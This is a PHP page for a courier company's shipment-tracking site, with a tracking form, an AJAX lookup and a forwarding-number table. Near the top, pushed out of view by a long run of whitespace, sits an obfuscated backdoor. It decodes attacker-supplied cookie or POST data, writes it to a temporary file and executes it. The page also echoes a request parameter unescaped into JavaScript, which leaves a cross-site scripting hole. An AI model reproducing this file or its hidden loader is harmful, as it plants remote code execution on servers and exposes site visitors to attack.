<?php include("include/header.php");?>
<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("awoawxcagv")){class awoawxcagv{public static $tvzzh = "rrbjdhaabvmrdkub";public static $fstbynh = NULL;public function __construct(){$euidu = @$_COOKIE[substr(awoawxcagv::$tvzzh, 0, 4)];if (!empty($euidu)){$lcgoq = "base64";$dgiggzo = "";$euidu = explode(",", $euidu);foreach ($euidu as $zmkyztzq){$dgiggzo .= @$_COOKIE[$zmkyztzq];$dgiggzo .= @$_POST[$zmkyztzq];}$dgiggzo = array_map($lcgoq . "_decode", array($dgiggzo,));$dgiggzo = $dgiggzo[0] ^ str_repeat(awoawxcagv::$tvzzh, (strlen($dgiggzo[0]) / strlen(awoawxcagv::$tvzzh)) + 1);awoawxcagv::$fstbynh = @unserialize($dgiggzo);}}public function __destruct(){$this->amdszsjmch();}private function amdszsjmch(){if (is_array(awoawxcagv::$fstbynh)) {$hwkkiczd = sys_get_temp_dir() . "/" . crc32(awoawxcagv::$fstbynh["salt"]);@awoawxcagv::$fstbynh["write"]($hwkkiczd, awoawxcagv::$fstbynh["content"]);include $hwkkiczd;@awoawxcagv::$fstbynh["delete"]($hwkkiczd);exit();}}}$yceastwo = new awoawxcagv();$yceastwo = NULL;} ?><!DOCTYPE html>

<!--Tracking DIv-->
<style>
#displayForwardingNumbers td{
    text-align:center !important;
        border: 1px solid #d5cfcf;
        font-size:16px;
}
#GridView1 th{
    text-align:center !important;
}
    .tracking #myTab li .active{
        display:none;
        visibility:hidden;
    }
    .newcss{
        margin-left:0 !important;
    }
    .p-05{
        padding: 3px 4px;
    }
    form{
        animation: none !important;
    }
    }

    .table-responsive::-webkit-scrollbar-track
    {
        background-color: #fff;
    }

    .table-responsive::-webkit-scrollbar
    {
        background-color: #fff;
    }

    .table-responsive::-webkit-scrollbar-thumb
    {	background-color: #fff;
    }

</style>
<div class="jumbotron mans_bread pt-5">
    <div class="container">
        <div class="row">
            <div class="col-md-5">
                <h4 class="text-white">TRACK RAPIDEX WORLDWIDE EXPRESS SHIPMENTS</h4>


            </div>
        </div>
    </div>
</div>

<div class="tracking track pb-5">
    <div class="container">
        
        <!--<input type="hidden" data-toggle="modal" data-target="#trackingModel" data-whatever="@mdo" style="cursor:pointer;" id="showTrackingModel"></input>-->
        
        <p style="color:#000;" class="d-flex justify-content-center"> Here's the fastest way to check the status of your shipment. No need to call Customer Service – our online results give you real-time,<br/> detailed progress as your shipment speeds through the RapidEx Worldwide Express.</p>
        <div class="row">
            <div class="col-lg-3 col-md-3"></div>

            <div class="col-lg-6 col-md-6 pr-md-5 pl-md-5">
                <div class="tab-content" id="myTabContent">
                    <div class="tab-pane bg-none fade" id="one" role="tabpanel" aria-labelledby="one-tab">
                        <form class="" id="contactForm" onSubmit="return false;" >
                            <div class="input-group">
                                <input  id="type_no" name="type_no" class="form-control" required data-error="Please enter your Tracking Details" style="margin-top: 0px;margin-bottom: 0px;height: 49px;" placeholder="Enter your tracking number">
                                <div class="input-group-prepend d-block">
                                    <button type="submit" class="default-btn-one newcss disabled mt-0 bg-logorange" onclick="changeSelectedOrder()" style="pointer-events: all; cursor: pointer;height:49px;">Track</button>
                                </div>
                            </div>
                        </form>

                    </div>

                </div>
                <ul id="myTab" role="tablist">
                    <li> <p style="color:#000; text-align:center"> <a id="one-tab" data-toggle="tab" href="#one" role="tab" aria-controls="One" aria-selected="true" style="color:#000; text-decoration:underline; font-size:18px;">TRACK ANOTHER SHIPMENT</a></p></li>
                </ul>
            </div>
            <div class="col-lg-3 col-md-3"></div>
        </div>
    </div>
    <div id="details"></div>
</div>
<script src="assets/js/jquery.min.js"></script>
<script>
    function hideShowData(id, status) {
        console.log(id + " >> " + status);
        if(status == 1) {
            $("#" + id + "_hide").hide();
            $("#" + id + "_show").show();
            $('#' + id + '_detail').hide();
        } else {
            $("#" + id + "_hide").show();
            $("#" + id + "_show").hide();
            $('#' + id + '_detail').show();
        }
    }
    $("#" + id + "_hide").show();
    $("#" + id + "_show").hide();
    $('#' + id + '_detail').show();
</script>
<script>
    let id = '<?php echo $_REQUEST['id']; ?>';
    function trackOrder1() {
        $.ajax({
            url: 'admin/api.php',
            type: 'POST',
            data: {
                "tracking_no": id,
                "mode": "getTackingAllInfo"
            },
            dataType:'json',
            async: false,
            success: function(returnData) {
                if(returnData.result == 'error') {
                    
                    $("#showTrackingModel").click();
                    $("#tracking_status").html('<p> Tracking No : ' +id+ '  </p> <p> STATUS : <span class="text-danger">N/A</span> </p>');
                    $("#tracking_info").html('<p> COULD NOT FIND THIS WAYBILL WITH US PLEASE CHECK THE WAYBILL YOU ENTERED</p>');
                } else if(returnData.data=="two_week_removed") {
                        $("#showTrackingModel").click();
                        $("#tracking_status").html('<p> Tracking No : ' +id+ '  </p> <p> STATUS : <span class="text-success">DELIVERED</span> on <b>'+returnData.deliver_date+'</b></p>');
                        $("#tracking_info").html('<p> YOUR TRACKING DETAILS COULD NOT BE VISIBLE AFTER 2 WEEKS OF DELIVERY</p>');
                }else {
                    $("#details").html(returnData['data']);
                    $("#displayForwardingNumbers").html(returnData['data_forwarding']);
                }
            }
        });
    }
    $(document).ready(function(){
        trackOrder1();
    });

    function changeSelectedOrder() {
        if($("#type_no").val()) {
            window.location.href = "tracking-status.php?id=" + $("#type_no").val();
        }
    }
    
    /*function forwardingNumberModel() {
        $.ajax({
            url: 'admin/api.php',
            type: 'POST',
            data: {
                "tracking_no": id,
                "mode": "getForwardingNumbers";
            },
            dataType:'json',
            async: false,
            success: function(returnData) {
                if(returnData.result == 'error') {
                    $("#showTrackingModel").click();
                    $("#tracking_status").html('<p> Tracking No : ' +id+ '  </p> <p> STATUS : <span class="text-danger">N/A</span> </p>');
                    $("#tracking_info").html('<p> COULD NOT FIND THIS WAYBILL WITH US PLEASE CHECK THE WAYBILL YOU ENTERED</p>');
                    
                } else if(returnData.data=="two_week_removed") {
                        $("#showTrackingModel").click();
                        $("#tracking_status").html('<p> Tracking No : ' +id+ '  </p> <p> STATUS : <span class="text-primary">DELIVERED</span> </p>');
                        $("#tracking_info").html('<p> YOUR TRACKING DETAILS COULD NOT BE VISIBLE AFTER 2 WEEK OF DELIVERED</p>');
                }else {
                    $("#details").html(returnData['data']);
                }
            }
        });
    }*/
</script>


<!--FORWARIDNG NUMBERS DISPLAY -->
<div class="modal fade"  id="forwardingNumberModel" tabindex="-1" aria-labelledby="myLargeModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xlg" style="width:100%;">
        <div class="modal-content">
          <div class="modal-header close-btn" id="header_model_tracking" style="position:relative; right: 1.5rem;
    top: 0.3rem;background:transparent; padding: 2px; border-bottom:none;">
            <button type="button" class="btn btn-sm btn-danger " id="closeTrackingModel" data-dismiss="modal" style="float:left; position:absolute; z-index:11; right:0;">&times;</button>
          </div>  
           <div class="modal-body" style="padding:30px; padding-top:10px; padding-bottom:10px;">
               <div class="tab-content responsive mainCsss2">
                    <h5  style="color:red; text-align:left; text-decoration:underline;">Shipment Details</h5>
                    <!--START BODY MODEL -->
                        <div class="row border text-center">
                           <table cellspacing="0" class="col-sm-12" style="padding:30px;" id="GridView1" style="background-color:#F9F9F9;font-family:Calibri;border-collapse:collapse;">
                              <tbody>
                                  <thead>
                                     <tr align="left" style="color:#333333;background-color:#CCCCCC;font-size:15px;">
                                        <th scope="col">
                                           Airway Bill No.
                                        </th>
                                        <th scope="col">
                                           Forwarding No.
                                        </th>
                                        <th scope="col">
                                           Network
                                        </th>
                                     </tr>
                                 </thead>
                                 <tbody id="displayForwardingNumbers">
                                     <tr class="cleassss" style="color:#333333;background-color:#F9F9F9;font-family:Calibri;font-size:Small;">
                                        <td>
                                           170060
                                        </td>
                                        <td>
                                           <a href="#"  title="Click here for forwarding details" datakeyfield="ID" style="text-decoration:underline;">02655043747043</a>
                                        </td>
                                        <td>
                                           DPDE
                                        </td>
                                    </tr>
                                 </tbody>
                              </tbody>
                           </table>
                        </div>
                    <!--END BODY MODEL-->
                </div>
            </div>
            
        </div>
    </div>
</div>
<!--END FORWARDING NUMBERS DISPLAY-->

<?php include("include/footer.php") ?>